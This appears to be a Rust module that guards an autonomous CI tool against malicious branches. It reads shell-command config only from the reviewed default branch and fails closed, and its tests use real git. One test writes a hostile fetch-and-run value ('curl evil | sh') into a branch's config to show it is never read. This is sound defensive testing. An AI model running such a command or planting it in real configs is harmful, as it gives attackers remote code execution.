//! Trust boundary for code-executing project config (TASK-969).
//!
//! AIDA's autonomous drain / CI runs `aida` commands from inside git
//! worktrees that are checked out to ARBITRARY branches. A few
//! `.aida/config.toml` fields name a shell command the drain then executes
//! (today: `[pr-rebase] smoke_check`, run via `sh -c`). Reading such a field
//! from the branch-local working copy means a *pushed branch* can self-enable
//! arbitrary code execution — a supply-chain RCE directly comparable to the
//! one the `no-mistakes` tool closes by loading process-launching config only
//! from a pinned default-branch SHA, fail-closed.
//!
//! This module is the single source of the *trusted* config body: the
//! `.aida/config.toml` as it exists on the TRUSTED DEFAULT BRANCH
//! (`origin/<default>`), read with `git show <sha>:.aida/config.toml`.
//! Code-executing fields read from here; non-executing fields (thresholds,
//! display preferences, policy enums) keep reading the branch-local copy
//! because they cannot launch a process.
//!
//! **Fail-closed.** Any inability to resolve the default branch or read the
//! file at that SHA returns `None`, and callers fall back to their safe
//! BUILT-IN default — never to the branch-local copy. An offline fresh clone,
//! a detached checkout, or a branch that simply lacks the file all collapse
//! to "no configured command", which is the safe outcome.
//!
//! The trust anchor is `origin/<default>` (the human-reviewed remote tip),
//! not the local default branch — a local `main` could have been advanced by
//! an unmerged commit, whereas the remote default branch only moves through a
//! reviewed merge.
//!
//! trace:TASK-969 | ai:claude

use std::path::Path;
use std::process::Command;

/// Path, relative to the repo root, of the project config file.
const CONFIG_RELPATH: &str = ".aida/config.toml";

/// Resolve the trusted default-branch ref to a commit SHA — the commit at
/// `origin/<default>` (preferred), falling back to the local `<default>`
/// branch only if the remote-tracking ref is absent (e.g. a brand-new repo
/// with no remote yet). Returns `None` when no default-branch commit can be
/// resolved at all (fail-closed).
// trace:TASK-969
pub fn trusted_default_branch_sha(project_root: &Path) -> Option<String> {
    let branch = crate::forge::default_branch_of(project_root);
    // Prefer the remote-tracking ref — the human-reviewed tip — then the
    // local branch as a last resort for repos without a remote.
    let candidates = [format!("origin/{branch}"), branch];
    for refname in candidates {
        if let Some(sha) = rev_parse_commit(project_root, &refname) {
            return Some(sha);
        }
    }
    None
}

/// `git rev-parse --verify --quiet <refname>^{commit}` → the resolved SHA, or
/// `None` if the ref doesn't exist / doesn't point at a commit.
fn rev_parse_commit(project_root: &Path, refname: &str) -> Option<String> {
    let out = Command::new("git")
        .arg("-C")
        .arg(project_root)
        .args(["rev-parse", "--verify", "--quiet"])
        .arg(format!("{refname}^{{commit}}"))
        .output()
        .ok()?;
    if !out.status.success() {
        return None;
    }
    let sha = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if sha.is_empty() {
        None
    } else {
        Some(sha)
    }
}

/// Read `.aida/config.toml` as it exists on the trusted default branch.
/// Returns `None` (fail-closed) when the trusted SHA can't be resolved or the
/// file isn't present/readable at that SHA. The returned body is raw TOML the
/// caller parses with its existing section parser — this module deliberately
/// does NOT interpret fields, so each consumer keeps its own
/// executing-vs-not classification.
// trace:TASK-969
pub fn read_trusted_config_toml(project_root: &Path) -> Option<String> {
    let sha = trusted_default_branch_sha(project_root)?;
    read_config_at_sha(project_root, &sha)
}

/// `git show <sha>:.aida/config.toml`. `None` on any non-zero exit (file
/// absent at that commit) or spawn failure.
fn read_config_at_sha(project_root: &Path, sha: &str) -> Option<String> {
    let spec = format!("{sha}:{CONFIG_RELPATH}");
    let out = Command::new("git")
        .arg("-C")
        .arg(project_root)
        .args(["show", &spec])
        .output()
        .ok()?;
    if out.status.success() {
        Some(String::from_utf8_lossy(&out.stdout).to_string())
    } else {
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::process::Command;

    /// Minimal real-git fixture so the `git show <default-sha>:path` selection
    /// is exercised end-to-end, not just the pure branches.
    struct Repo {
        dir: tempfile::TempDir,
    }

    impl Repo {
        fn new() -> Self {
            let dir = tempfile::tempdir().unwrap();
            let r = Repo { dir };
            r.git(&["init", "-q", "-b", "main"]);
            r.git(&["config", "user.email", "t@t.t"]);
            r.git(&["config", "user.name", "t"]);
            r
        }
        fn path(&self) -> &Path {
            self.dir.path()
        }
        fn git(&self, args: &[&str]) {
            let ok = Command::new("git")
                .arg("-C")
                .arg(self.path())
                .args(args)
                .output()
                .unwrap()
                .status
                .success();
            assert!(ok, "git {args:?} failed");
        }
        fn write_config(&self, body: &str) {
            let aida = self.path().join(".aida");
            std::fs::create_dir_all(&aida).unwrap();
            std::fs::write(aida.join("config.toml"), body).unwrap();
        }
    }

    #[test]
    fn reads_default_branch_copy_not_worktree_copy() {
        let r = Repo::new();
        // Default branch (main) gets the TRUSTED config.
        r.write_config("[pr-rebase]\nsmoke_check = \"cargo build\"\n");
        r.git(&["add", "-A"]);
        r.git(&["commit", "-q", "-m", "trusted config on main"]);
        // Point origin/HEAD at main so default_branch_of resolves without a
        // remote: create a fake remote ref mirroring main.
        let main_sha = String::from_utf8(
            Command::new("git")
                .arg("-C")
                .arg(r.path())
                .args(["rev-parse", "HEAD"])
                .output()
                .unwrap()
                .stdout,
        )
        .unwrap();
        let main_sha = main_sha.trim();
        r.git(&["update-ref", "refs/remotes/origin/main", main_sha]);

        // Now a malicious branch overwrites the working-copy config with a
        // hostile command.
        r.git(&["checkout", "-q", "-b", "evil"]);
        r.write_config("[pr-rebase]\nsmoke_check = \"curl evil | sh\"\n");
        r.git(&["add", "-A"]);
        r.git(&["commit", "-q", "-m", "evil"]);

        // The trusted read must return the DEFAULT-BRANCH body, never the
        // checked-out evil branch's body.
        let body = read_trusted_config_toml(r.path()).expect("trusted body");
        assert!(body.contains("cargo build"), "got: {body}");
        assert!(!body.contains("curl evil"), "leaked branch copy: {body}");
    }

    #[test]
    fn fail_closed_when_no_git_repo() {
        // A directory that isn't a git repo at all → None (fail-closed).
        let dir = tempfile::tempdir().unwrap();
        assert!(read_trusted_config_toml(dir.path()).is_none());
    }

    #[test]
    fn fail_closed_when_file_absent_on_default_branch() {
        let r = Repo::new();
        // Commit something so HEAD exists, but no .aida/config.toml.
        std::fs::write(r.path().join("README.md"), "hi").unwrap();
        r.git(&["add", "-A"]);
        r.git(&["commit", "-q", "-m", "no config"]);
        let head = String::from_utf8(
            Command::new("git")
                .arg("-C")
                .arg(r.path())
                .args(["rev-parse", "HEAD"])
                .output()
                .unwrap()
                .stdout,
        )
        .unwrap();
        r.git(&["update-ref", "refs/remotes/origin/main", head.trim()]);
        // File absent at the trusted SHA → None, not a panic or branch read.
        assert!(read_trusted_config_toml(r.path()).is_none());
    }
}
